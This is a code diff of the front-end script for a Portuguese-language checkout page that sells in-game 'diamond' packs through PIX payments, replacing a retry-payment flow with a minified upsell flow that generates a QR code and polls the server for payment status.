+if(data&&data.pix&&data.pix.pix_qr_code)code=data.pix.pix_qr_code;
+else if(data&&data.pix&&data.pix.qrcode)code=data.pix.qrcode;
+else if(data&&data.pix_qrcode)code=data.pix_qrcode;
+else if(data&&data.data&&data.data.pix)code=data.data.pix.pix_qr_code||data.data.pix.qrcode;
+txHash=data.hash||data.id||data.transaction_hash||(data.data&&(data.data.hash||data.data.id))||'';
+if(!code){btn.disabled=false;btn.textContent='QUERO O PACK - GERAR PIX';alert('Erro ao gerar PIX. Tente novamente.');return;}
+pixCode=code;
+document.getElementById('cta-area').style.display='none';
+document.getElementById('pix-area').classList.add('active');
+document.getElementById('pix-qr-img').src='https://api.qrserver.com/v1/create-qr-code/?size=250x250&data='+encodeURIComponent(code);
+document.getElementById('pix-code-box').textContent=code;
+if(txHash)startPolling();
+})
+.catch(function(err){btn.disabled=false;btn.textContent='QUERO O PACK - GERAR PIX';alert('Erro: '+err.message);});
 }
-
-// ── Init: Load order data ──
-(function init(){
-    var params = new URLSearchParams(window.location.search);
-    originalHash = params.get('txid') || sessionStorage.getItem('original_txid') || '';
-
-    if(!originalHash){
-        document.getElementById('rp-loading').classList.remove('active');
-        document.getElementById('rp-error').classList.add('active');
-        document.getElementById('rp-error-msg').textContent = 'Nenhuma tentativa encontrada. Volte à loja e tente novamente.';
-        return;
-    }
-
-    sessionStorage.setItem('original_txid', originalHash);
-
-    // Fetch order details from backend (source of truth)
-    fetch('/api/retry-pix?hash=' + encodeURIComponent(originalHash))
-        .then(function(r){ return r.json(); })
-        .then(function(data){
-            document.getElementById('rp-loading').classList.remove('active');
-
-            if(data.error || !data.amount){
-                document.getElementById('rp-error').classList.add('active');
-                document.getElementById('rp-error-msg').textContent = data.error || 'Não foi possível recuperar os dados.';
-                return;
-            }
-
-            // Price from BACKEND (source of truth)
-            var priceReais = (data.amount / 100).toFixed(2).replace('.', ',');
-            document.getElementById('rp-price').textContent = priceReais;
-
-            // Display details: try backend product_title, then sessionStorage
-            var diamonds = sessionStorage.getItem('plano') || '';
-            var bonus = sessionStorage.getItem('bonus') || '';
-
-            // Try to parse from product title or map by price if sessionStorage is empty
-            if(!diamonds && data.product_title){
-                var match = data.product_title.match(/(\d[\d.]*)/);
-                if(match) diamonds = match[1];
-            }
-            if(!diamonds && data.amount){
-                var val = data.amount / 100;
-                if(Math.abs(val - 12.90) < 0.1) { diamonds = '1060'; bonus = '106'; }
-                else if(Math.abs(val - 17.90) < 0.1) { diamonds = '2180'; bonus = '218'; }
-                else if(Math.abs(val - 19.90) < 0.1) { diamonds = '5600'; bonus = '560'; }
-                else if(Math.abs(val - 49.90) < 0.1) { diamonds = '22400'; bonus = '2240'; }
-            }
-
-            var dEl = document.getElementById('rp-diamonds');
-            if(diamonds && diamonds !== '???'){
-                dEl.textContent = Number(diamonds.replace(/\D/g,'')).toLocaleString('pt-BR');
-                dEl.parentElement.style.display = 'flex';
-            } else {
-                dEl.parentElement.style.display = 'none';
-            }
-
-            var bEl = document.getElementById('rp-bonus');
-            if(bonus && bonus !== '---'){
-                bEl.textContent = Number(bonus.replace(/\D/g,'')).toLocaleString('pt-BR');
-                bEl.parentElement.style.display = 'flex';
-            } else {
-                bEl.parentElement.style.display = 'none';
-            }
-
-            // Discount from sessionStorage (display only)
-            var disc = sessionStorage.getItem('desconto') || '90';
-            document.getElementById('rp-discount').textContent = disc + '%';
-
-            // Show main content
-            document.getElementById('rp-main').style.display = 'block';
-        })
-        .catch(function(err){
-            document.getElementById('rp-loading').classList.remove('active');
-            document.getElementById('rp-error').classList.add('active');
-            document.getElementById('rp-error-msg').textContent = 'Erro de conexão: ' + err.message;
-        });
-})();
-
-// ── Retry PIX ──
-function retryPix(){
-    var btn = document.getElementById('rp-retry-btn');
-    btn.disabled = true;
-    btn.textContent = '⏳ GERANDO NOVO PIX...';
-
-    var utms = getUTMs();
-    var payload = { hash: originalHash };
-    Object.keys(utms).forEach(function(k){ payload[k] = utms[k]; });
-
-    fetch('/api/retry-pix', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-    })
-    .then(function(r){ return r.json(); })
-    .then(function(data){
-        console.log('Retry PIX response:', JSON.stringify(data));
-
-        var pixCode = null;
-        if(data && data.pix && data.pix.pix_qr_code) pixCode = data.pix.pix_qr_code;
-        else if(data && data.pix && data.pix.qrcode) pixCode = data.pix.qrcode;
-        else if(data && data.pix_qrcode) pixCode = data.pix_qrcode;
-        else if(data && data.data && data.data.pix) pixCode = data.data.pix.pix_qr_code || data.data.pix.qrcode;
-
-        if(!pixCode){
-            btn.disabled = false;
-            btn.textContent = '🟢 TENTAR NOVAMENTE';
-            alert('Erro ao gerar PIX: ' + (data.error || data.message || 'Tente novamente'));
-            return;
-        }
-
-        newPixCode = pixCode;
-        newTxHash = data.hash || data.id || data.transaction_hash || '';
-        if(!newTxHash && data.data) newTxHash = data.data.hash || data.data.id || '';
-
-        // Update price from backend response
-        var amt = data.original_amount || data.amount;
-        if(amt){
-            var p = (amt / 100).toFixed(2).replace('.', ',');
-            document.getElementById('rp-price').textContent = p;
-        }
-
-        // Build summary
-        var dRow = document.getElementById('rp-diamonds').parentElement;
-        var diamondsText = (dRow && dRow.style.display !== 'none') ? document.getElementById('rp-diamonds').textContent : '';
-        var bRow = document.getElementById('rp-bonus').parentElement;
-        var bonusText = (bRow && bRow.style.display !== 'none') ? document.getElementById('rp-bonus').textContent : '';
-        var priceText = document.getElementById('rp-price').textContent;
-
-        var summary = diamondsText ? ('💎 ' + diamondsText + ' Diamantes') : '💎 Pacote de Diamantes';
-        if(bonusText) summary += ' + 🎁 ' + bonusText + ' Bônus';
-        summary += ' · R$ ' + priceText;
-        document.getElementById('rp-pix-summary').textContent = summary;
-
-        // Show QR Code
-        var qrUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=' + encodeURIComponent(pixCode);
-        document.getElementById('rp-qr-img').src = qrUrl;
-
-        // Hide CTA, show PIX area
-        document.getElementById('rp-cta-area').style.display = 'none';
-        document.getElementById('rp-pix-area').classList.add('active');
-
-        // Start polling
-        startPolling();
-    })
-    .catch(function(err){
-        btn.disabled = false;
-        btn.textContent = '🟢 TENTAR NOVAMENTE';
-        alert('Erro de conexão: ' + err.message);
-    });
+function copiarPix(){
+if(!pixCode)return;var btn=document.getElementById('pix-copy-btn');
+if(navigator.clipboard){navigator.clipboard.writeText(pixCode).then(function(){btn.textContent='COPIADO!';btn.classList.add('copied');setTimeout(function(){btn.textContent='COPIAR CODIGO PIX';btn.classList.remove('copied');},3000);});}
+else{var ta=document.createElement('textarea');ta.value=pixCode;document.body.appendChild(ta);ta.select();document.execCommand('copy');document.body.removeChild(ta);btn.textContent='COPIADO!';btn.classList.add('copied');setTimeout(function(){btn.textContent='COPIAR CODIGO PIX';btn.classList.remove('copied');},3000);}
 }
-
-// ── Copy PIX ──
-function copyPix(){
-    if(!newPixCode) return;
-    if(navigator.clipboard){
-        navigator.clipboard.writeText(newPixCode).then(function(){
-            var btn = document.querySelector('.rp-copy-btn');
-            btn.textContent = '✅ COPIADO!';
-            setTimeout(function(){ btn.textContent = '📋 COPIAR CÓDIGO PIX'; }, 3000);
-        });
-    } else {
-        var ta = document.createElement('textarea');
-        ta.value = newPixCode;
-        document.body.appendChild(ta);
-        ta.select();
-        document.execCommand('copy');
-        document.body.removeChild(ta);
-        var btn = document.querySelector('.rp-copy-btn');
-        btn.textContent = '✅ COPIADO!';
-        setTimeout(function(){ btn.textContent = '📋 COPIAR CÓDIGO PIX'; }, 3000);
-    }
-}
-
-// ── Payment Status Polling ──
-function isPaid(d){
-    if(!d) return false;
-    if(d.status==='paid'||d.status==='approved') return true;
-    if(d.payment_status==='paid'||d.payment_status==='approved') return true;
-    if(d.data&&(d.data.status==='paid'||d.data.status==='approved')) return true;
-    if(d.transaction&&(d.transaction.status==='paid'||d.transaction.status==='approved')) return true;
-    return false;
-}
-
-function startPolling(){
-    if(!newTxHash) return;
-    var statusEl = document.getElementById('rp-pay-status');
-    checkInterval = setInterval(function(){
-        fetch('/api/check-tx?hash=' + newTxHash)
-            .then(function(r){ return r.json(); })
-            .then(function(data){
-                if(isPaid(data)){
-                    clearInterval(checkInterval);
-                    statusEl.className = 'rp-status paid';
-                    statusEl.textContent = '✅ PIX CONFIRMADO! Seu pedido foi confirmado.';
-                    try{ if(typeof fbq==='function') fbq('track','Purchase',{value:parseFloat(sessionStorage.getItem('total_preco')||'0'),currency:'BRL'}); }catch(e){}
-                    setTimeout(function(){ window.location.href = 'obrigado.html'; }, 3000);
-                }
-            })
-            .catch(function(){});
-    }, 5000);
-}
+function isPaid(d){if(!d)return false;if(d.status==='paid'||d.status==='approved')return true;if(d.payment_status==='paid'||d.payment_status==='approved')return true;if(d.data&&(d.data.status==='paid'||d.data.status==='approved'))return true;return false;}
+function startPolling(){pollInterval=setInterval(function(){fetch('/api/check-tx?hash='+txHash).then(function(r){return r.json();}).then(function(data){if(isPaid(data)){clearInterval(pollInterval);var st=document.getElementById('pix-status');st.className='pst paid';st.textContent='PAGAMENTO CONFIRMADO! Seus itens serao creditados em instantes.';try{if(typeof fbq==='function')fbq('track','Purchase',{value:27.00,currency:'BRL'});}catch(e){}setTimeout(function(){window.location.href='obrigado.html';},3000);}}).catch(function(){});},5000);}
+function pularOferta(){window.location.href='obrigado.html';}
 </script>
 </body>
 </html>
